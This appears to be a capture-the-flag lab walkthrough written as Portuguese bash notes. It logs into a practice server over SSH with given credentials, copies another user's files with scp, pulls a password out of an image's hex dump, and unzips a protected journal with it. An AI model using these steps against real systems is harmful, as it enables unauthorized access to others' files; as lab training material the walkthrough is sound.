bash
```bash
# ==========================================
# PENTEST - SSH / SCP / FILE ANALYSIS
# ALVO: <ip_alvo>
# PORTA SSH: 22222
# USUÁRIO: Summer
# ==========================================


# 1. ACESSAR O SERVIDOR VIA SSH
# ------------------------------------------

ssh -p 22222 Summer@<ip_alvo>

# senha: winter



# 2. COPIAR A IMAGEM PARA O KALI LINUX
# ------------------------------------------

scp -P 22222 Summer@<ip_alvo>:/home/Morty/Safe_Password.jpg /home/

# Arquivo transferido:
# Safe_Password.jpg


# 3. ANALISAR A IMAGEM
# ------------------------------------------

# Visualizar o conteúdo hexadecimal da imagem:

xxd /home/Safe_Password.jpg

# Procurar referências à palavra password:

xxd /home/Safe_Password.jpg | grep -i "password"
#senha: Meeseek

# Objetivo:
# Identificar possíveis informações armazenadas
# no conteúdo binário da imagem.


# 4. COPIAR O ARQUIVO JOURNAL
# ------------------------------------------

scp -P 22222 Summer@<ip_alvo>:/home/Morty/journal.txt.zip /home/

# Arquivo transferido:
# journal.txt.zip


# 5. DESCOMPACTAR O JOURNAL
# ------------------------------------------

unzip /home/journal.txt.zip

# Utilizar a senha identificada durante
# a análise da imagem, caso o arquivo
# esteja protegido por senha.
#senha: Meeseek


# 6. VERIFICAR O CONTEÚDO EXTRAÍDO
# ------------------------------------------

ls -la /home/

# Localizar o arquivo journal.txt
# e visualizar seu conteúdo.


# ==========================================
# FERRAMENTAS UTILIZADAS
# ==========================================

# SSH  - Acesso remoto ao servidor.
# SCP  - Transferência de arquivos.
# XXD  - Visualização hexadecimal de arquivos.
# GREP - Pesquisa de palavras no conteúdo.
# UNZIP - Extração de arquivos ZIP.


# ==========================================
# CONCLUSÃO DO PENTEST
# ==========================================

# 1. Foi realizado acesso remoto via SSH.
# 2. Foi transferida a imagem Safe_Password.jpg.
# 3. Foi realizada análise hexadecimal com XXD.
# 4. Foi pesquisada uma possível senha utilizando GREP.
# 5. Foi transferido o arquivo journal.txt.zip.
# 6. A senha identificada foi utilizada na extração
#    do arquivo protegido.
#
# RESULTADO:
# Recuperação do conteúdo do journal.txt.
#
# ==========================================
```
